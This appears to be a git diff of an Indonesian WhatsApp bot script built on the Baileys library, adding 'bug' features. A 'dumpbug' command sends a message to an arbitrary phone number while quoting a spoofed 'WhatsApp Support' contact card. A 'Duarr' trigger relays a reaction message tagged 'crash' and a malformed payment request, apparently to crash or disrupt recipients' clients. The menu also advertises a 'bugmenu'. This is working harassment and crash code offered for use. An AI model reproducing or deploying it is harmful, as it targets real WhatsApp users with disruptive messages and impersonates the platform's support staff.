@@ -43,9 +43,6 @@ const { iphone6 } = require('./baseikal/virtex/iphone6')
 const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
 const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
 //=================================================//
-runvia = 'herokuapp.com'
-namaowner = 'Fajar Alfarizi'
-namabotz = 'Felix MD'
 //=================================================//
 virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
 const content = JSON.stringify(m.message)
@@ -99,6 +96,7 @@ const botNumber = await haikal.decodeJid(haikal.user.id)
 const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const itsMe = m.sender == botNumber ? true : false
 const text = q = args.join(" ")
+const dn = args.join(' ')
 const isBan = banned.includes(m.sender)
 const quoted = m.quoted ? m.quoted : m
 const mime = (quoted.msg || quoted).mimetype || ''
@@ -115,6 +113,11 @@ const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') 
 const AntiLink = m.isGroup ? ntilink.includes(from) : false 
 const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
 const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
+//©from: ivan
+const reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
+//©from: andik
+const contactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
+
 //=================================================//
 const doc = { 
 key: {
@@ -308,9 +311,23 @@ Selama ${clockString(new Date - user.afkTime)}
 user.afkTime = -1
 user.afkReason = ''
 }
+if (body.startsWith(`Duarr`)) { 
+haikal.relayMessage(from, { reactionMessage }, { messageId: "crash" })
+requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "FajarGans"}}}), { userJid: from })
+haikal.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}
+
 //=================================================//
 switch(command) {
 //=================================================//
+case 'dumpbug':
+if (!isCreator) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
+if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}dumpbug 628xxxxxx`)
+if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug 628xxxxxx`)
+if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug 628xxxxxx`)
+if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug 628xxxxxx`)
+haikal.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: contactMessage })
+reply(`Sukses mengirim bug ke nomor ${dn}`)
+break
 case 'inibug': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -4176,15 +4193,11 @@ break
 case 'menu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ Owner : ${botname}
+◎ Lib : Multi-Device
+◎ Terbit : *01-09-1999*
 
-Information bot🔐
-Name bot : *${namabotz}*
-Owner name : *${namaowner}*
-Lib : *Baileys*
-Status : *Online*
-Running with : *${runvia}*
-Runtime : *${runtime(os.uptime())}*
-
+[ 🇲🇨 Ini adalah Bot Pribadi  Dari Indonesia 👋 ]
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 *MENU*
 ┏━━⊱
 ┣❏➥ bugmenu
@@ -4212,7 +4225,7 @@ Runtime : *${runtime(os.uptime())}*
 contact me Wa.me/6281333782061
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©Fajar`, contextInfo:{"externalAdReply": {"title": `SC FELIX-MD`,"body": `Selamat ${salam} kak ${pushname}`,
+©Haikal`, contextInfo:{"externalAdReply": {"title": `SC FELIX-MD`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://instagram.com/mhmdfjralfarizi_`,
